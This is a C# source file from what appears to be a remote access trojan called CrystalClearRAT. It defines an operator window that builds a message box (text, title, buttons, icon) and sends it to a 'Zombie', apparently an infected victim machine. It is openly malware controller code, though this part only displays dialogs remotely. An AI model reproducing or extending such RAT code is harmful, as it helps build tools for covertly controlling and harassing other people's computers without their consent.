using CrystalClearRAT.Functions;
using CrystalClearRAT.Helper;
using CrystalClearRAT.Web;
using CrystalClearRAT.ZombieModel;
using MahApps.Metro.Controls;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Forms;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace CrystalClearRAT.Windows
{
    /// <summary>
    /// Logika interakcji dla klasy DialogBuilder.xaml
    /// </summary>
    public partial class DialogBuilder : MetroWindow
    {

        private Zombie zombie;
        public DialogBuilder(Zombie zombie)
        {
            InitializeComponent();
            this.zombie = zombie;

            List<int> messageBoxButtons = Enum.GetValues(typeof(MessageBoxButtons)).Cast<int>().ToList();
            List<int> messageBoxIcons = Enum.GetValues(typeof(MessageBoxIcon)).Cast<int>().ToList();

            messageBoxButtons = messageBoxButtons.Distinct().ToList();
            messageBoxIcons = messageBoxIcons.Distinct().ToList();

            foreach (MessageBoxIcon i in messageBoxIcons)
            {
                iconComboBox.Items.Add(new ComboboxItem(i.ToString(), (int)i));
            }

            foreach (MessageBoxButtons b in messageBoxButtons)
            {
                optionsComboBox.Items.Add(new ComboboxItem(b.ToString(), (int)b));
            }

            iconComboBox.SelectedItem = iconComboBox.Items[0];
            optionsComboBox.SelectedItem = optionsComboBox.Items[0];
            
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            Server.Send(DialogInfo.Create(messageTextBox.Text, titleTextBox.Text, (optionsComboBox.SelectedItem as ComboboxItem).Value, (iconComboBox.SelectedItem as ComboboxItem).Value), zombie);
        }


    }
}
